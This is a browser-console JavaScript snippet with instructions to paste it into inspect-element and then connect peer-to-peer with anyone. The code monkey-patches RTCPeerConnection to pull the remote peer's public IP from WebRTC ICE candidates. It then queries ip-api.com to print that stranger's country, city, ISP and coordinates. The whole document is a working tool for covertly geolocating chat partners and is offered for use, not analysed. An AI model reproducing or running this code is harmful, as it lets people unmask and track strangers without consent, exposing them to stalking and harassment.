
// go on inspect element, in the console part of it, and paste the code. Press Enter once pasted, // and connect P2P(peer to peer) with anyone.

window.oRTCPeerConnection =
  window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
  const pc = new window.oRTCPeerConnection(...args);

  pc.oaddIceCandidate = pc.addIceCandidate;

  pc.addIceCandidate = function (iceCandidate, ...rest) {
    const fields = iceCandidate.candidate.split(" ");

    console.log(iceCandidate.candidate);
    const ip = fields[4];
    if (fields[7] === "srflx") {
      getLocation(ip);
    }
    return pc.oaddIceCandidate(iceCandidate, ...rest);
  };
  return pc;
};

let getLocation = async (ip) => {
  let url = `http://ip-api.com/json/${ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query`;

  await fetch(url).then((response) =>
    response.json().then((json) => {
      const output = `
          ---------------------
          Country: ${json.country}
          State: ${json.regionName}
          City: ${json.city}
          Isp: ${json.isp}
          Org: ${json.org}
          Lat / Long: (${json.lat}, ${json.lon})
          ---------------------
          `;
      console.log(output);
    })
  );
};

